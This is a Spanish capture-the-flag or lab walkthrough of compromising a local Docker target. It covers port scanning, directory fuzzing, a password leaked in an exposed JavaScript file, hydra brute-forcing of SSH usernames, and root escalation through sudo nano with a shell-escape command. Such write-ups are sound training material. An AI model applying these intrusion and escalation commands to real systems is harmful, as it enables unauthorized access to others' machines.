## Enumeracion
Realizo un escaneo en busqueda de puertos abiertos
```
nmap -p- --open --min-rate 5000 -n -sS -Pn 172.17.0.2 -oG puertos
```
**Resultados:**

- 80/tcp → Apache
- 3000/tcp → Node.js (Express)
- 5000/tcp → SSH
```
nmap -p80,3000,5000 -sCV 172.17.0.2 -oN escaneo
   5   │ PORT     STATE SERVICE VERSION
   6   │ 80/tcp   open  http    Apache httpd 2.4.61 ((Debian))
   7   │ |_http-server-header: Apache/2.4.61 (Debian)
   8   │ |_http-title: Mi Sitio
   9   │ 3000/tcp open  http    Node.js Express framework
  10   │ |_http-title: Error
  11   │ 5000/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
  12   │ | ssh-hostkey: 
  13   │ |   256 f8:37:10:7e:16:a2:27:b8:3a:6e:2c:16:35:7d:14:fe (ECDSA)
  14   │ |_  256 cd:11:10:64:60:e8:bf:d9:a4:f4:8e:ae:3b:d8:e1:8d (ED25519)
  15   │ MAC Address: 02:42:AC:11:00:02 (Unknown)
  16   │ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
### Enumeracion web
Realizo un escaneo a los servicios web 
```
whatweb 172.17.0.2
whatweb 172.17.0.2:3000
```
Se identifica:
- Apache en puerto 80
- Express en puerto 3000

### Fuzzing de directorios
Realizo fuzzing en busqueda de directorios.(Empiezo por el puerto 80 en busqeuda de directorios).
```
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x js,json,txt,php,html
```
Los resultados encontrados importantes son:
- /backend/
- /javascript/
- authentication.js

### Analisis de JavaScript
```
curl http://172.17.0.2/authentication.js
```
Contenido:
```
app.post('/recurso/', (req, res) => {

const token = req.body.token;

if (token === 'tokentraviesito') {

res.send('lapassworddebackupmaschingonadetodas');

}

});
```

### Acceso por SSH
Al encontrar una posible contraseña realizo fuerza bruta para poder encontrar el usuario para la contraseña encontrada.
```
hydra -L /usr/share/wordlists/rockyou.txt -p lapassworddebackupmaschingonadetodas ssh://172.17.0.2 -s 5000 -V
```
Credenciales obtenidas:
- Usuario : lovely
- Password : lapassworddebackupmaschingonadetodas

### Login SSH
Ya con el usuario y la contraseña ingreso a ssh por el puerto 5000
```
ssh lovely@172.17.0.2 -p 5000

Password: lapassworddebackupmaschingonadetodas
```

## Escalada de privilegios

### Verifico los permisos de sudo
```
sudo -l 

(ALL) NOPASSWD: /usr/bin/nano
```

### Explotacion de nano
*export TERM=xterm*
Utilizo este comando ya que al utilizar una kitty me da error si quiero utilizar nano.

*sudo nano*
Dentro de nano:
 1) CTRL + R 
 2) CTRL + X

Ejecutar:
```
reset; sh 1>&0 2>&0
```

Al ejecutar el comando me da acceso root.
```
whoami

root

  

id

uid=0(root) gid=0(root)
```